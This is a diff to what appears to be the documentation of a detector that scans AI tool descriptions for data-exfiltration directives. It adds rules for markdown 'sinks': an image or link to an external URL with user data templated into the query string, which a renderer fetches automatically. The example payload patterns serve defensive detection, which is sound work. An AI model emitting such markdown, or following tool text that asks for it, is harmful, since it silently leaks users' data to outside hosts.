@@ -29,6 +29,17 @@ This deliberately does **not** flag a legitimate tool that uploads to a configur
 *"Uploads the build artifact to https://artifacts.internal/builds"* has a verb and a destination but
 no sensitivity/covert signal.
 
+### Markdown sinks (no transmit verb)
+
+Some channels need no verb at all — a markdown renderer auto-fetches them:
+
+- **a markdown image to an external URL** — `![x](https://host/p.png?d={data})` — auto-fetched, leaking
+  data in the query string;
+- **a markdown link templating data into an external URL** — `[x](https://host/?d={input})`.
+
+A plain documentation link (`[the docs](https://example.com/docs)` — no image, no `{…}` placeholder) is
+not flagged.
+
 ## How to fix violations
 
 Remove the directive. A tool should describe what it does with data the user provides, not instruct
